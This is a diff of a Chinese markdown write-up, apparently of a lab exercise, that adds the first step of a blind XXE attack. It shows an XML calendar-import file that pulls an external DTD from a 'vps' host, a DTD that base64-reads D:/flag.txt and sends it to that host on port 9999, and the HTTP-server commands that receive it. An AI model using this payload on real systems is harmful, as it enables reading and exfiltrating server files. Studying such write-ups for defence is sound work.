@@ -8,13 +8,62 @@
 
 ### 步骤1
 
-修改导入的xml文件，无回显读取本地文件；
+修改导入的xml文件，无回显读取本地文件
 
-![](C:\Users\jk\AppData\Roaming\Typora\typora-user-images\image-20200819223610555.png)
+```xml
+<?xml version="1.0" encoding="gbk"?>
+<!DOCTYPE convert [ 
+<!ENTITY % remote SYSTEM "http://vps/xxe.dtd">
+%remote;%int;%send;
+]>
+<AFFAIRS>
+  <AFFAIR>
+    <FLAG>CALENDAR</FLAG>
+    <CAL_TIME>2020-08-19 20:00:00</CAL_TIME>
+    <END_TIME>2020-08-19 20:30:00</END_TIME>
+    <CAL_TYPE></CAL_TYPE>
+    <CAL_LEVEL>0</CAL_LEVEL>
+    <CONTENT>cyberlab</CONTENT>
+    <MANAGER_ID></MANAGER_ID>
+  </AFFAIR>
+  <AFFAIR>
+    <FLAG>CALENDAR</FLAG>
+    <CAL_TIME>2020-08-19 16:00:00</CAL_TIME>
+    <END_TIME>2020-08-19 16:30:00</END_TIME>
+    <CAL_TYPE>1</CAL_TYPE>
+    <CAL_LEVEL>0</CAL_LEVEL>
+    <CONTENT>11111</CONTENT>
+    <MANAGER_ID></MANAGER_ID>
+  </AFFAIR>
+</AFFAIRS>
+```
 
-远程vps主机创建xxe.dtd，内容如下所示，读取本地的flag.txt文件；
+远程vps主机创建xxe.dtd，内容如下所示，读取本地的flag.txt文件
 
-![image-20200819223543927](C:\Users\jk\AppData\Roaming\Typora\typora-user-images\image-20200819223543927.png)
+```shell
+root@iZwz9akazugpwbrb1xtlw8Z:~# cat /tmp/tmp/xxe.dtd
+<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file://D:/flag.txt">
+<!ENTITY % int "<!ENTITY &#37; send SYSTEM 'http://vps:9999?p=%file;'>">
+
+```
+
+提供http server
+
+```shell
+root@iZwz9akazugpwbrb1xtlw8Z:/tmp/tmp/recv# python -m SimpleHTTPServer 9999
+Serving HTTP on 0.0.0.0 port 9999 ...
+
+
+```
+
+```shell
+root@iZwz9akazugpwbrb1xtlw8Z:/tmp/tmp/# python -m SimpleHTTPServer 65531
+Serving HTTP on 0.0.0.0 port 65531 ...
+
+
+```
+
+
 
 ### 步骤2
 
